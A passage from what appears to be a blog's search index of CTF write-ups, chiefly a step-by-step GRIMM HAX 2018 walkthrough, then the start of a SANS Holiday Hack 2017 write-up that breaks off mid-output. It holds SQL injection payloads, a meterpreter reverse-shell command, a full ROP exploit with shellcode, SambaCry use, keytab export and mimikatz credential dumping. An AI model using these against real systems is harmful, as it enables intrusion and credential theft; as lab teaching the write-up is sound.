"CTF, pentest", "tags": "ctf, pentest, pwn", "date": "2018-05-23 03:08:38 +0800", "snippet": "This is the write-up for challenges I have done GRIMM HAX challenge.Welcome, Bobby (100pts)Accessing the website at http://www.haxcorp.grimm-co.com/, we are provided with a login page with username as password. The objective of this level is to login as admin. Seeing this as a warmup level, I immediately try the following classic SQL injectionAnd we are in. The flag is GRIMM-BOBBY-TABLES-WOULD-BE-PROUD.Oh How the Tables have Turned (100pts)From the description of the challenge, I predicted that this is another SQL injection to find the flag in a different table in the database, especially when we are presented with a search functionality. Testing out the searchbox with a single quote yielded an error.From this error, we acknowledge that this is a MySQL database. An attack that I could think of at that moment is to use UNION-based SQL injection to gradually figure out the structure of the database and find out where the flag is in the database. One reason of using this type of SQL-injection is because the number of selected columns might have been known from the result table in the application (3 in this case). In UNION-based SQL-injection, the number of columns selected in the queries has to be the same.First, let’s try to figure out all the database existed in the MySQL instance by reading the information_schema database. This database contains many useful information about the instance itself and from there, we can figure out the structure of the database.&#39; UNION SELECT schema_name, 2, 3 from information_schema.schemata;#The next step is to checkout all the table in interesting databases that we see from here. I am going to checkout the GRIMM database in this case.&#39; UNION SELECT table_name, table_schema, 3 from information_schema.tables WHERE table_schema = &#39;GRIMM&#39;;#From this result, we can kinda know that the flag will be in the table flags from the database GRIMM. Let’s checkout all the columns in that table.&#39; UNION SELECT table_name, column_name, 3 from information_schema.columns WHERE table_name = &#39;flags&#39;;#There are 2 columns in this table namely id and flag. Let’s select all the data in this table to obtain the flag.&#39; UNION SELECT id, flag, 1337 FROM GRIMM.flags;#And the flag is GRIMM-SQL-INJECT.Protected Files (200pts)This is the next level that we need to solve in order to progress. The objective is to get access to an FTP server to retrieve the VPN configuration as suggested by the hint from another challenge. Let’s proceed using the same SQL-injection strategy as the last level. In this level, the vsftpd database is the target. The other FTP-related database vsftp is empty.&#39; UNION SELECT table_name, table_schema, 3 from information_schema.tables WHERE table_schema = &#39;vsftpd&#39;;#&#39; UNION SELECT table_name, column_name, 3 from information_schema.columns WHERE table_name = &#39;accounts&#39;;#Note that there are some column names that do not belong to the target accounts table because there are other tables of the same name in the database. However, this is good enough as we can see the interesting username and pass columns.Let’s plug all the hashes into a website to crack them.Let’s connect to the FTP server on the same host and try to login with the visible creds.This is the VPN configuration to connects to the internal infrastructure. The flag is in management.ovpnThe flag is GRIMM-PEEKIN-IN-YO-NETWORK.Enumeration of the internal infrastructureFrom this level and on, we need to connect to the internal infrastructure using the obtained VPN configuration.openvpn --config management.ovpnAfter connected to the internal network, let’s take a look at some network information to get to know the subnets in the scope. From the output of OpenVPN, I noticed some subnets:Fri May 25 22:39:11 2018 /sbin/ip addr add dev tun0 local 10.8.0.10 peer 10.8.0.9Fri May 25 22:39:11 2018 /sbin/ip route add 10.123.14.0/24 via 10.8.0.9Fri May 25 22:39:11 2018 /sbin/ip route add 10.123.15.0/24 via 10.8.0.9Fri May 25 22:39:11 2018 /sbin/ip route add 10.8.0.1/32 via 10.8.0.9The client machine is on the 10.8.0.0 network so I assumed that the target networks are 10.123.14.0/24 and 10.123.15.0/24. Let’s have an initial enumeration of those network using a ping scan. Note that there might have been non-pingable machines at this point.➜ grimm git:(master) ✗ nmap -sn 10.123.14.0/24 Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-25 22:43 EDTNmap scan report for 10.123.14.10Host is up (0.072s latency).Nmap scan report for 10.123.14.12Host is up (0.042s latency).Nmap scan report for 10.123.14.122Host is up (0.044s latency).Nmap done: 256 IP addresses (3 hosts up) scanned in 7.63 seconds➜ grimm git:(master) ✗ nmap -sn 10.123.15.0/24 Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-25 22:43 EDTNmap scan report for 10.123.15.10Host is up (0.044s latency).Nmap scan report for 10.123.15.15Host is up (0.063s latency).Nmap scan report for 10.123.15.20Host is up (0.039s latency).Nmap scan report for 10.123.15.53Host is up (0.040s latency).Nmap done: 256 IP addresses (4 hosts up) scanned in 5.08 secondsLet’s next scan the common ports on those hosts.➜ grimm git:(master) ✗ nmap -v -sV -iL hosts.txt Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-25 22:47 EDTNSE: Loaded 42 scripts for scanning.Initiating Ping Scan at 22:47Scanning 7 hosts [4 ports/host]Completed Ping Scan at 22:47, 0.08s elapsed (7 total hosts)Initiating Parallel DNS resolution of 7 hosts. at 22:47Completed Parallel DNS resolution of 7 hosts. at 22:47, 0.03s elapsedInitiating SYN Stealth Scan at 22:47Scanning 7 hosts [1000 ports/host]Discovered open port 3389/tcp on 10.123.15.10Discovered open port 22/tcp on 10.123.14.12Discovered open port 139/tcp on 10.123.15.10Discovered open port 445/tcp on 10.123.15.10Discovered open port 135/tcp on 10.123.15.10Discovered open port 80/tcp on 10.123.14.10Discovered open port 53/tcp on 10.123.15.10Discovered open port 593/tcp on 10.123.15.10Discovered open port 636/tcp on 10.123.15.10Discovered open port 3269/tcp on 10.123.15.10Discovered open port 389/tcp on 10.123.15.10Discovered open port 464/tcp on 10.123.15.10Discovered open port 88/tcp on 10.123.15.10Discovered open port 3268/tcp on 10.123.15.10Completed SYN Stealth Scan against 10.123.15.10 in 24.85s (6 hosts left)Completed SYN Stealth Scan against 10.123.14.12 in 25.23s (5 hosts left)Completed SYN Stealth Scan against 10.123.14.122 in 25.44s (4 hosts left)Completed SYN Stealth Scan against 10.123.14.10 in 25.49s (3 hosts left)Completed SYN Stealth Scan against 10.123.15.15 in 25.63s (2 hosts left)Completed SYN Stealth Scan against 10.123.15.20 in 25.72s (1 host left)Completed SYN Stealth Scan at 22:48, 25.82s elapsed (7000 total ports)Initiating Service scan at 22:48Scanning 14 services on 7 hostsCompleted Service scan at 22:48, 11.17s elapsed (14 services on 7 hosts)NSE: Script scanning 7 hosts.Initiating NSE at 22:48Completed NSE at 22:48, 0.38s elapsedInitiating NSE at 22:48Completed NSE at 22:48, 0.18s elapsedNmap scan report for 10.123.15.10Host is up (0.042s latency).Not shown: 988 filtered portsPORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2018-05-26 02:48:53Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: corp.hax, Site: Default-First-Site-Name)445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: CORP)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: corp.hax, Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal ServicesService Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windowsNmap scan report for 10.123.15.15Host is up (0.042s latency).All 1000 scanned ports on 10.123.15.15 are filteredNmap scan report for 10.123.15.20Host is up (0.043s latency).All 1000 scanned ports on 10.123.15.20 are filteredNmap scan report for 10.123.15.53Host is up (0.043s latency).All 1000 scanned ports on 10.123.15.53 are filteredNmap scan report for 10.123.14.10Host is up (0.044s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION80/tcp open http nginxNmap scan report for 10.123.14.12Host is up (0.041s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNmap scan report for 10.123.14.122Host is up (0.043s latency).All 1000 scanned ports on 10.123.14.122 are filteredRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 7 IP addresses (7 hosts up) scanned in 38.71 seconds Raw packets sent: 14052 (618.172KB) | Rcvd: 74 (3.144KB)Git Your Daily News (100pts)From the initial enumeration result, I tried to access the web server on 10.123.14.10 and fortunately it is the GitLab server that I needed to find. The flag is GRIMM-GIT-GUD-SUN.Pipeline (300pts)To access gitlab, register and login. I was a little bit lucky at this level because I was doing a class-project at the same time which involved continuous integration using Travis-CI, I knew that I need to somehow achieve code execution using continuous integration that comes with Gitlab. From this documentation from Gitlab, I created a project and commit a .gitlab-ci.yml file to execute command on the gitlab machine:job1: script: &quot;ls -la&quot;After committing the new file, the job defined in this configuration file was automatically run.After testing out several commands for a while, I proceeded to obtaining an SSH-shell on the remote host by adding a bash script that writes my public key to ~/.ssh/authorized_keys. And there is our shell:The flag is GRIMM-CONTINUOUS-PWNTEGRATION. Note that the flag can be obtained just from using the configuration file to traverse the file system. However, I wanted to take this further so that I could explore the system more easily.To make persistent and pivoting easier, I started a meterpreter shell on this machine and manage it using metasploit running on an AWS EC2 instance.msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;public-ip&amp;gt; LPORT=4444 -f elf &amp;gt; fpasswdpwnLister (400pts)This is definitely my favorite part of the challenge. Let’s first play with the binary a little bit to see what it was doing.DiscoveryRunning the binary did not give any output.Having done some CTFs that have this kind of binary, I was sure that it was running as a service listening for incoming connection. That was actually the case because we are trying to access a particular service on a remote machine. I did a netstat command to figure out on which port it was listening. It was port 12345.Connecting to the service using nc, we are prompted with a file listing program.After that, I figured out the service was running on 10.123.15.53 by doing a connect scan from the gitlab-runner machine on the networks. The following asciinema record is me playing with the remote service. I did an SSH-portforward to get the service on localhost:1234.As you can see, the service did not work as intended all the time and sometime it would eat up the last character from the input (0:30). Let’s do some more work on the binary to figure out why that happenned.ExploitationLet’s checkout the protection mechanisms of the binary to figure out possible approaches. I was using the checksec command comes with pwntools.➜ grimm git:(master) ✗ file listerlister: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.35, BuildID[sha1]=61ef9b28e166ee62f7241d920a1058974241d61b, not stripped➜ grimm git:(master) ✗ checksec lister[*] &#39;/root/someWorkspace/workspace/ctfs/2018/grimm/grimm/lister&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segmentsFrom this result. We can see that NX is disabled and there are RWX segments. Possible solutions may be the classic stack buffer overflow where data read to a buffer is executed. However, I still needed to find a way to bypass ASLR with the assumption that ASLR is enabled by default on the remote host. Let’s do some reverse engineering on the binary to gather some information.Open the main function, we can see what was going on: The program listen on port 12345 and waiting for connection Everytime a client connects to the program, it makes a fork and run the main functionality: Asking for a directory path to list all the files in there It receives at most 0x200 bytes of input for the path. However the buffer is only 0x140 byte-long. There is obviously a stack buffer-overflow here It replaces the character at strlen(input)-2 with a NULL byte. This is why we see the last character being eaten up It sends back the modified buffer to the client It uses the opendir and readdir functions (in the ls function) to list files in the provided path. If the path is not a directory or any error happenned, the string “Directory does not exist.” is returned. Note that in the main program, whenever it attempts to send data to the client, it uses the custom sendstring function, which uses strlen to determine the length of the buffer to be sent. From the above observation, I came up with the following plans to exploit the binary: Take advantage of the input being echoed back to the client to leak addresses on the stack to bypass ASLR and then overwrite rip with a ROP chain to system(&quot;/bin/sh&quot;). I wanted to leak the address of __libc_start_main+234 so that I could calculate the base address of libc. However, this did not work (or it’s just me haven’t figure out if this is possible) for the following reasons: The buffer was sent using the sendstring custom function, which uses strlen to determine the buffer length. It will stop when it hits a NULL byte. The fd local variable is before the address that I needed to leak, and it takes up 4 bytes. However, the actual correct fd does not take up this many bytes so there will be NULL bytes before the address we need to leak. If I overwrite the fd to some incorrect value to bypass strlen, the output will not be sent back to the client. At this moment, I realized that the main function attempts to close the client fd before it returns. In this approach, I overflow the buffer to overwrite the fd with wrong values so the socket is not closed when the main function returns, and THEN control rip to read in my shellcode and execute it. In this way, I did not have to guess the stack address and still achieve a partially arbitrary write.I used ROP to make the program read my shellcode in. However, there were 2 problems that I needed to solve before I can write the exploit: Identify the version of the libc being used since it was not given.I first tried to locate glibc on my Kali machine, which was in /lib/x86_64-linux-gnu/. However, I did not find it on the remote machine and did not know why. I played a little bit more with the program on the remote host and figure out the /home directory contains the user ec2-user.Having worked with the Linux-AMI of AWS EC2 before, I immediately knew that this was running on a RHEL machine in oppose to my Debian machine. I setup an EC2 instance myself and study the filesystem. Turned out that it was in /lib64 Identify the base address of libc.Having worked with Linux for a while, I knew that the memory mapping of a process is stored in /proc/&amp;lt;pid&amp;gt;/maps. However, it is not possible to read file using the program. It can only list files in a directory. I played around with the /proc directory and found out that the directory /proc/&amp;lt;pid&amp;gt;/map_files also contains parts of the information in the maps file. As you can see later in the asciinema record, there are filenames that are address ranges. They are indeed symlinks to the actual libc and from there, I was able to identify the base address of libcBut how did I figure out the PID of the process? With the assumption that most of the time, newly spawned processes on the remote machine are only the children of the lister process, I took the following steps to get the PID of a child process: Connect to the service to create a process. Read the /proc directory Connect to the service the second time to create a new process. Read the /proc directory again The difference between the 2 output is the PID of the newly created process the second time we connect to the service.From this point on, I had all the necessary information to write the exploit. The code below has comments to help you understand it.from pwn import *import stringcontext.arch = &#39;amd64&#39;HOST = &quot;10.123.15.53&quot;PORT = 12345#HOST = &quot;localhost&quot;#PORT = 1234libc = ELF(&#39;./libc-2.17.so&#39;)libc_base = 0x7fd9dcd83000gadgets = {}gadgets[&#39;system&#39;] = libc.symbols[&#39;system&#39;]gadgets[&#39;binsh&#39;] = next(libc.search(&quot;/bin/sh\\x00&quot;))gadgets[&#39;pop_rdi&#39;] = 0x22298gadgets[&#39;syscall&#39;] = 0xc0065gadgets[&#39;pop_rax&#39;] = 0x1d150gadgets[&#39;pop_rsi&#39;] = 0x21738gadgets[&#39;pop_rdx&#39;] = 0x1b92gadgets[&#39;xor_rax_rax&#39;] = 0x8906fgadgets[&#39;push_rax&#39;] = 0xa5e8context.log_level = &#39;ERROR&#39;def getDir(dirToList): print &quot;Getting {}&quot;.format(dirToList) M = &quot;&quot; for i in range(0, 10): # Pad the path with additional characters because of the glitch try: s = remote(HOST, PORT) payload = &#39;/&#39; * i + &#39;{}/&#39;.format(dirToList) s.sendline(payload) m = &quot;&quot; while True: try: c = s.recv(1) m += c except: break s.close() if &quot;Directory does not exist&quot; not in m: M = m break except: s.close() return Mdef getProcesses(): m = getDir(&quot;/proc&quot;).strip(&#39;\\n&#39;).split(&#39;\\n&#39;) m = [int(x) for x in m if not any(e in x for e in (string.ascii_letters + string.punctuation))] return mdef getMapFiles(pid): m = getDir(&quot;/proc/{}/map_files&quot;.format(pid)) return mdef createHang(): s = remote(HOST, PORT) return sdef setRDI(num): return p64(gadgets[&#39;pop_rdi&#39;]) + p64(num)def setRAX(num): return p64(gadgets[&#39;pop_rax&#39;]) + p64(num)def setRSI(num): return p64(gadgets[&#39;pop_rsi&#39;]) + p64(num)def setRDX(num): return p64(gadgets[&#39;pop_rdx&#39;]) + p64(num)def readBuf(addr, length, fd=4, skipfd=False): payload = &quot;&quot; payload += setRAX(0) if not skipfd: payload += setRDI(fd) payload += setRSI(addr) payload += setRDX(length) payload += p64(gadgets[&#39;syscall&#39;]) return payloaddef main(): # Get pid of the program p = getProcesses() s = createHang() p1 = getProcesses() diff = [int(x) for x in p1 if x not in p] print diff for pid in diff: m = getMapFiles(pid) print m # After obtaining the libc base address, calculate all the gadget addresses for k in gadgets.keys(): gadgets[k] += libc_base print k, hex(gadgets[k]) # Building shellcode filename = &quot;flag.txt&quot; shellcode = filename + &#39;\\x00&#39; shellcode += asm(open(&#39;shellcode.asm&#39;).read()) # Trigger the overflow payload = &#39;A&#39; * (320 - 8) payload += p64(0) payload += &#39;B&#39; * 8 # rbp # ROP chain to read shellcode to a RWX memory segment payload += readBuf(0x601000, len(shellcode) + 1) # read file name payload += p64(0x601000 + len(filename + &quot;\\x00&quot;) + 1) print len(payload) # The length must not exceed 0x200 s = createHang() print s.recv() s.sendline(payload) s.sendline(shellcode) print s.recv(40)if __name__ == &#39;__main__&#39;: main()Shellcode:nopnopnop; Open filemov rax, 2mov rdi, 0x601000xor rsi, rsixor rdx, rdxsyscall; Read filemov rdi, raxxor rax, raxmov rsi, 0x601c00mov rdx, 40syscall; Write buffer to client fdmov rax, 1mov rdi, 4syscallnopnopnopThe flag is GRIMM-STACK-OVERFLOWDSecondary Control (300pts)With the provided description (“The Administrator may CRY if you get further into their network”) I was certain that the exploit gotta be the famous MS17-010 from WannaCry. From the nmap scan before and with a little bit of DNS enumeration, I figured out that there are 2 Domain Controllers on the network. The primary DC at 10.123.15.10 is a Windows Server 2016 machine, while the secondary DC at 10.123.15.20 is unknown. At this point, I have not obtained a shell on the lister machine yet and only tried to enumerate the network more and more from the gitlab-runner machine. However, the exploit did not work against the primary DC.It took me quite a long time to decide to move on to obtaining a shell on the lister machine and this is one of the mistake that I’ve made. I should have done this earlier because later on, to progress, I needed to pivot through the lister machine. Using the same exploit from the previous level and modify the shellcode, I was able to obtain a shell through the existing connection with the binary. Here is the shellcode with descriptive comments:nopnopnop; dup2(stdin, 4) since 4 is the client fd.mov rax, 33mov rdi, 4xor rsi, rsisyscall; dup2(stdout, 4)mov rax, 33inc rsisyscall; dup2(stderr, 4)mov rax, 33inc rsisyscall; execve(&quot;/bin/sh&quot;, 0, 0). From the exploit, a &quot;/bin/sh&quot; string was placed at 0x601000mov rax, 59xor rdx, rdxmov rsi, rdxmov rdi, 0x601000syscall; After the syscall, stdin, stdout and stderr was redirected to our client fd and we are interacting with /bin/sh on the remote machine nownopnopnopI again used an SSH-tunnel to forward 10.123.15.53:12345 to 127.0.0.1:1234ssh -D 1337 -i grimmKey gitlab-runner@10.123.14.12After obtaining this basic shell, I again upgraded it to a meterpreter shell so that I can manage them all in metasploit from one of my EC2 instance.At the same moment I realized that there is not only one exploit that has CRY in its name. There was also SambaCRY. I then proceeded to use Metasploit’s autoroute to pivot through the meterpreter session on the lister machine and scan the networks for open 445 port. And BOOOM! The secondary DC is now visible through pivoting:Metasploit actually has a module to exploit SambaCry here. Running the exploit against the secondary DC at 10.123.15.20 gave me a shell.The flag is in /root and is GRIMM-I-SAMBA-CRY-EVERY-TIME.As always, I upgraded this shell to a meterpreter shell for easy management.Prime Location (400pts)After got onto the secondary DC, I still did not understand how a Linux machine could be a Domain Controller. Turned out that it can be done using samba. I started to do enumeration on the localhost and found some interesting stuffs. Samba was connecting to the primary DC Where samba was running from Samba configuration files and some data Although these are interesting information, for example the secrets files that contains encrypted credentials or the Kerberos keytab, I did not use these to gain access to the primary DC. However, I did came across many new things during investigating these information. For example, I was able to obtain the hashWhile I tried using Kerberos utils like in this blog post, I noticed that samba-tool was there but I didn’t use it. Further more, I looked at the bash history and realized that I really should have tried it earlier.I guess maybe this was just a hint, and I tried the same thing: create a new user and add it to the Domain Admins group. And now I am a Domain Admin!There is another way to get the flag that I would also like to show you in this writeup, which uses smb-client to access the shares on the primary DC: Use samba-tool to export the keytab from the primary DC /usr/local/samba/bin/samba-tool domain exportkeytab /tmp/test.keytab Init a new Kerberos ticket for smb-client on DC2 kinit -k -t /tmp/test.keytab CEO@CORP.HAX Use smb-client with the generated ticket smbclient -k //dc1.corp.hax/C\\$/ -c ls smbclient -k //dc1.corp.hax/C\\$/ -c &quot;get Users\\\\Administrator\\\\flag.txt /tmp/flag.txt&quot; And the flag is GRIMM-DOMAIN-ADMIN-BEST-ADMIN.Forgotten Password (400pts)This level is a little bit tricky if you did not get it quickly. From the description, I assumed that I needed to use mimikatz to retrieve that password of the CEO user. I tried to use Internet Explorer to download mimikatz but it didn’t allow me to save the file so I used this following Powershell script to download it:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12$WebClient = New-Object System.Net.WebClient$WebClient.DownloadFile(&quot;https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180502/mimikatz_trunk.zip&quot;,&quot;C:\\Users\\fpasswd1\\Desktop\\meme.zip&quot;)After RDP into the machine, you may encounter a cmd window that appears for a few seconds and then disappers. I did not notice that at first and thought I hit a dead end by just using mimikatz. That turned out to be a task to perform the login of the CEO user so that I could retrieve the password from memory. It took me a while to figure that out. To trigger the action again, just go to Task Scheduler and run the action.And then use mimikatz to get the passwords:mimikatz# privilege::debugmimikatz# sekurlsa::logonPasswordsThe flag is GRIMM-memory-MAGIC.Top of the Food Chain (500pts)Now being the Domain Admin, I could just RDP again into the CEO machine. However I needed to figure out which machine was that in the first place. Open the DNS records, the CEO machine is at 10.123.14.122 and the hostname is ceo.Let’s RDP into that machine as the Domain Admin (yes, RDP inside RDP). The flag is at C:\\flag.txt.The flag is GRIMM-BIG-LEAGUE-HAXOR." }, { "title": "2017 SANS Holiday Hacking Challenge", "url": "/posts/SANS-HHC-2017/", "categories": "CTF, pentest", "tags": "ctf, pentest", "date": "2017-12-16 22:42:59 +0800", "snippet": "This year, I’ve had the chance to participate in SANS Holiday Hacking Challenge. The first time I did it was last year. I didn’t think it was interesting with real pentesting stuffs until I read the writeups, so I decided to start early this year.Terminal ChallengesFinding Great Book PagesThings I’ve learnedTerminal ChallengesWINTER WONDER LANDINGLinux command hijackingClick on the terminal, we are presented with the object: to find elftalkd. | \\ &#39; / -- (*) -- &amp;gt;*&amp;lt; &amp;gt;0&amp;lt;@&amp;lt; &amp;gt;&amp;gt;&amp;gt;@&amp;lt;&amp;lt;* &amp;gt;@&amp;gt;*&amp;lt;0&amp;lt;&amp;lt;&amp;lt; &amp;gt;*&amp;gt;&amp;gt;@&amp;lt;&amp;lt;&amp;lt;@&amp;lt;&amp;lt; &amp;gt;@&amp;gt;&amp;gt;0&amp;lt;&amp;lt;&amp;lt;*&amp;lt;&amp;lt;@&amp;lt; &amp;gt;*&amp;gt;&amp;gt;0&amp;lt;&amp;lt;@&amp;lt;&amp;lt;&amp;lt;@&amp;lt;&amp;lt;&amp;lt; &amp;gt;@&amp;gt;&amp;gt;*&amp;lt;&amp;lt;@&amp;lt;&amp;gt;*&amp;lt;&amp;lt;0&amp;lt;*&amp;lt; \\*/ &amp;gt;0&amp;gt;&amp;gt;*&amp;lt;&amp;lt;@&amp;lt;&amp;gt;0&amp;gt;&amp;lt;&amp;lt;*&amp;lt;@&amp;lt;&amp;lt; ___\\\\U//___ &amp;gt;*&amp;gt;&amp;gt;@&amp;gt;&amp;lt;0&amp;lt;&amp;lt;*&amp;gt;&amp;gt;@&amp;gt;&amp;lt;*&amp;lt;0&amp;lt;&amp;lt; |\\\\ | | \\\\| &amp;gt;@&amp;gt;&amp;gt;0&amp;lt;*&amp;lt;0&amp;gt;&amp;gt;@&amp;lt;&amp;lt;0&amp;lt;&amp;lt;&amp;lt;*&amp;lt;@&amp;lt;&amp;lt; | \\\\| | _(UU)_ &amp;gt;((*))_&amp;gt;0&amp;gt;&amp;lt;*&amp;lt;0&amp;gt;&amp;lt;@&amp;lt;&amp;lt;&amp;lt;0&amp;lt;*&amp;lt; |\\ \\| || / //||.*.*.*.|&amp;gt;&amp;gt;@&amp;lt;&amp;lt;*&amp;lt;&amp;lt;@&amp;gt;&amp;gt;&amp;lt;0&amp;lt;&amp;lt;&amp;lt; |\\\\_|_|&amp;amp;&amp;amp;_// ||*.*.*.*|_\\\\db//_ &quot;&quot;&quot;&quot;|&#39;.&#39;.&#39;.|~~|.*.*.*| ____|_ |&#39;.&#39;.&#39;.| ^^^^^^|____|&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;| ~~~~~~~~ &#39;&quot;&quot;&quot;&quot;`------&#39;My name is Bushy Evergreen, and I have a problem for you.I think a server got owned, and I can only offer a clue.We use the system for chat, to keep toy production running.Can you help us recover from the server connection shunning?Find and run the elftalkd binary to complete this challenge.Let’s try using find:elf@5e210ec83121:/run/elftalk/bin$ find / -xdev -iname &quot;*elftalkd*&quot;bash: /usr/local/bin/find: cannot execute binary file: Exec format errorNo surprise. Let’s use ls to find thiself@5e210ec83121:/tmp$ ls -laR / | grep -B 10 elftalkdls: cannot open directory &#39;/proc/tty/driver&#39;: Permission deniedls: cannot open directory &#39;/root&#39;: Permission denied/run/elftalk:total 12drwxr-xr-x 1 root root 4096 Dec 4 14:32 .drwxr-xr-x 1 root root 4096 Dec 4 14:32 ..drwxr-xr-x 1 root root 4096 Dec 4 14:32 bin/run/elftalk/bin:total 7224drwxr-xr-x 1 root root 4096 Dec 4 14:32 .drwxr-xr-x 1 root root 4096 Dec 4 14:32 ..-rwxr-xr-x 1 root root 7385168 Dec 4 14:29 elftalkdls: cannot open directory &#39;/var/cache/apt/archives/partial&#39;: Permission deniedls: cannot open directory &#39;/var/cache/ldconfig&#39;: Permission deniedls: cannot open directory &#39;/var/lib/apt/lists/partial&#39;: Permission deniedThere we go. The binary is in /run/elftalk/binelf@466dc314ba46:~$ /run/elftalk/bin/elftalkd Running in interactive mode --== Initializing elftalkd ==--Initializing Messaging System!Nice-O-Meter configured to 0.90 sensitivity.Acquiring messages from local networks...--== Initialization Complete ==-- _ __ _ _ _ _ | |/ _| | | | | | | ___| | |_| |_ __ _| | | ____| | / _ \\ | _| __/ _` | | |/ / _` || __/ | | | || (_| | | &amp;lt; (_| | \\___|_|_| \\__\\__,_|_|_|\\_\\__,_|-*&amp;gt; elftalkd! &amp;lt;*-Version 9000.1 (Build 31337) By Santa Claus &amp;amp; The Elf TeamCopyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.Using libc6 version 2.23-0ubuntu9LANG=en_US.UTF-8Timezone=UTCCommencing Elf Talk Daemon (pid=6021)... done!Background daemon...CRYOKINETIC MAGICCandy Cane Striper ___ / __&#39;. .-&quot;&quot;&quot;-. .-&quot;&quot;-| | &#39;.&#39;. / .---. \\ / .--. \\ \\___\\ \\/ /____| | / / \\ `-.-;-(`_)_____.-&#39;._ ; ; `.-&quot; &quot;-:_,(o:==..`-. &#39;. .-&quot;-, | | / \\ / `\\ `. \\ / .-. \\ \\ \\ | Y __...\\ \\ \\ / / \\/ /\\ | | | .--&quot;&quot;--.| .-&#39; \\ &#39;.`---&#39; / \\ \\ / / |` \\&#39; _...--.; &#39;---&#39;` \\ &#39;-&#39; / jgs /_..---.._ \\ .&#39;\\\\_ `. `--&#39;` .&#39; (_) `&#39;/ (_) / `._ _.&#39;| .&#39; ``````` &#39;-...--&#39;`My name is Holly Evergreen, and I have a conundrum.I broke the candy cane striper, and I&#39;m near throwing a tantrum.Assembly lines have stopped since the elves can&#39;t get their candy cane fix.We hope you can start the striper once again, with your vast bag of tricks.Run the CandyCaneStriper executable to complete this challenge.This time we are prompted to run a binary. It has no execute permission and we cannot set this permission for the binary as well.elf@b83c138c0b53:~$ ls -latotal 68drwxr-xr-x 1 elf elf 4096 Dec 15 20:00 .drwxr-xr-x 1 root root 4096 Dec 5 19:31 ..-rw-r--r-- 1 elf elf 220 Aug 31 2015 .bash_logout-rw-r--r-- 1 root root 3143 Dec 15 19:59 .bashrc-rw-r--r-- 1 elf elf 655 May 16 2017 .profile-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriperelf@b83c138c0b53:~$ chmod +x CandyCaneStriper elf@b83c138c0b53:~$ ls -latotal 68drwxr-xr-x 1 elf elf 4096 Dec 15 20:00 .drwxr-xr-x 1 root root 4096 Dec 5 19:31 ..-rw-r--r-- 1 elf elf 220 Aug 31 2015 .bash_logout-rw-r--r-- 1 root root 3143 Dec 15 19:59 .bashrc-rw-r--r-- 1 elf elf 655 May 16 2017 .profile-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriperRefer to the tweet from Holly the Elf, I found a hint to the solution:https://twitter.com/GreenesterElf/status/938542480487677952This is a 64-bit machine, so we need to find the linker at /lib64/ld-linux-x86-64.so.2. Let’s try this out:elf@b83c138c0b53:~$ /lib64/ld-linux-x86-64.so.2 /home/elf/CandyCaneStriper _..._ .&#39;\\\\ //`, /\\\\.&#39;``&#39;.=&quot;, / \\/ ;==| /\\\\/ .&#39;\\`,` / \\/ `&quot;&quot;` /\\\\/ /\\\\/ /\\ / /\\\\/ /`\\/ \\\\/ `The candy cane striping machine is up and running!WINCONCEIVABLE: THE CLIFFS OF WINSANITYThe troublesome process termination ___,@ / &amp;lt; ,_ / \\ _, ? \\`/______\\`/ ,_(_). |; (e e) ;| \\___ \\ \\/\\ 7 /\\/ _\\8/_ \\/\\ \\&#39;==&#39;/ | /| /| \\ \\___)--(_______|//|//| \\___ () _____/|/_|/_| / () \\ `----&#39; / () \\ &#39;-.______.-&#39; jgs _ |_||_| _ (@____) || (____@) \\______||______/My name is Sparkle Redberry, and I need your help.My server is atwist, and I fear I may yelp.Help me kill the troublesome process gone awry.I will return the favor with a gift before nigh.Let’s examine the running processeself@f22c16457eec:~$ ps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDelf 1 0.0 0.0 18028 2764 pts/0 Ss 06:31 0:00 /bin/bash /sbin/initelf 8 0.0 0.0 4224 740 pts/0 S 06:32 0:00 /usr/bin/santaslittlehelperdelf 11 0.1 0.0 13528 6404 pts/0 S 06:32 0:00 /sbin/kworkerelf 12 0.0 0.0 18248 3168 pts/0 S 06:32 0:00 /bin/bashelf 18 0.7 0.0 71468 26544 pts/0 S 06:32 0:00 /sbin/kworkerelf 74 0.0 0.0 34424 2860 pts/0 R+ 06:32 0:00 ps auxI then tried to kill the process using the kill command. I did used the wrong syntax but no error popped out and the process wasn’t killed either.elf@f22c16457eec:~$ kill -9 pidof santaslittlehelperdelf@f22c16457eec:~$ ps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDelf 1 0.0 0.0 18028 2764 pts/0 Ss 06:31 0:00 /bin/bash /sbin/initelf 8 0.0 0.0 4224 740 pts/0 S 06:32 0:00 /usr/bin/santaslittlehelperdelf 11 0.1 0.0 13528 6404 pts/0 S 06:32 0:00 /sbin/kworkerelf 12 0.0 